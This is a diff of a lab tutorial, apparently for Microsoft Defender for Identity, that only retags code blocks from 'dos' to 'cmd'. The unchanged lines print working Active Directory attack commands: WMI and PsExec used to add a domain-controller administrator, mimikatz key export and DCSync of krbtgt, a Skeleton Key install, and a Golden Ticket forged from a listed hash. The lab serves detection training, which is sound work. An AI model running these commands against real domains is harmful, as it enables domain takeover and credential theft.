@@ -47,13 +47,13 @@ Using WMI via the command line, try to create a process locally on the domain co
 
 1. Open the Command Line, running in context of *SamiraA* from the **VictimPC**, execute the following command:
 
-   ```dos
+   ```cmd
    wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
    ```
 
 1. Now with the user created, add the user to the "Administrators" group on the domain controller:
 
-   ```dos
+   ```cmd
    PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
    ```
 
@@ -93,7 +93,7 @@ Using **mimikatz**, we'll attempt to export the master key from the domain contr
 
 1. Execute the following command against the domain controller:
 
-   ```dos
+   ```cmd
    mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
    ```
 
@@ -119,7 +119,7 @@ The two common hacking tool sets that allow attackers to attempt malicious repli
 
 From the **VictimPC**, in context of **SamirA**, execute the following Mimikatz command:
 
-```dos
+```cmd
 mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
 ```
 
@@ -141,13 +141,13 @@ Let's use a Skeleton Key to see how this type of attack works:
 
 1. Move **mimikatz** to **ContosoDC** using the **SamirA** credentials we acquired before. Make sure to push the right architecture of **mimikatz.exe** based on the architecture type of the DC (64-bit vs 32-bit). From the **mimikatz** folder, execute:
 
-   ```dos
+   ```cmd
    xcopy mimikatz.exe \\ContosoDC\c$\temp
    ```
 
 1. With **mimikatz** now staged on the DC, remotely execute it via PsExec:
 
-   ```dos
+   ```cmd
    PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
    ```
 
@@ -159,7 +159,7 @@ Let's use a Skeleton Key to see how this type of attack works:
 
 On **VictimPC**, open up a cmd prompt (in the context of **JeffL**), execute the following to try to become context of RonHD.
 
-```dos
+```cmd
 runas /user:ronhd@contoso.azure "notepad"
 ```
 
@@ -169,7 +169,7 @@ When prompted, use the wrong password on purpose. This action proves that the ac
 
 But Skeleton Key adds an additional password to each account. Do the "runas" command again but this time use "mimikatz" as the password.
 
-```dos
+```cmd
 runas /user:ronhd@contoso.azure "notepad"
 ```
 
@@ -192,7 +192,7 @@ After stealing the "Golden Ticket", ("krbtgt" account explained [here via Malici
 
 1. As JeffL, run the below command on **VictimPC** to acquire the domain SID:
 
-   ```dos
+   ```cmd
    whoami /user
    ```
 
@@ -202,7 +202,7 @@ After stealing the "Golden Ticket", ("krbtgt" account explained [here via Malici
 
 1. Using **mimikatz**, take the copied Domain SID, along with the stolen "krbtgt" user's NTLM hash to generate the TGT. Insert the following text into a cmd.exe as JeffL:
 
-   ```dos
+   ```cmd
    mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
    ```
 
@@ -216,7 +216,7 @@ After stealing the "Golden Ticket", ("krbtgt" account explained [here via Malici
 
 1. Acting as an attacker, execute the following Pass-the-Ticket command to use it against the DC:
 
-   ```dos
+   ```cmd
    dir \\ContosoDC\c$
    ```
 
